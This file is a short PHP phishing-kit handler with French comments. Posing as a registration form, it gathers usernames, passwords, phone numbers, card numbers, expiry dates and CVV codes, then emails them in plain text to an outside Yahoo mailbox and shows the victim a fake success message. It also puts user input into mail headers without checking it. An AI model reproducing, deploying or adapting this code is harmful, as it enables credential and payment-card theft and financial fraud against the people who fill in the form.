<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $phone = $_POST['phone'];
    $card = $_POST['card'];
    $expiry = $_POST['expiry'];
    $cvv = $_POST['cvv'];

    // Créer le message à envoyer par e-mail
    $message = "Nom d'utilisateur : $username\n";
    $message .= "Mot de passe : $password\n";
    $message .= "Numéro de téléphone : $phone\n";
    $message .= "Numéro de carte : $card\n";
    $message .= "Date d'expiration : $expiry\n";
    $message .= "Code de sécurité (CVV) : $cvv\n";

    // Envoyer l'e-mail
    $to = "xolsp123@yahoo.com";
    $subject = "Nouvelle demande d'inscription";
    $headers = "From: $username <$phone>";

    if (mail($to, $subject, $message, $headers)) {
        echo "<script>alert('Votre demande a été envoyée avec succès.'); window.location.replace('votre-page-de-remerciement.html');</script>";
    } else {
        echo "<script>alert('Une erreur s'est produite lors de l'envoi de votre demande. Veuillez réessayer plus tard.');</script>";
        error_log("Erreur lors de l'envoi de l'e-mail : " . error_get_last()['message']);
    }
}
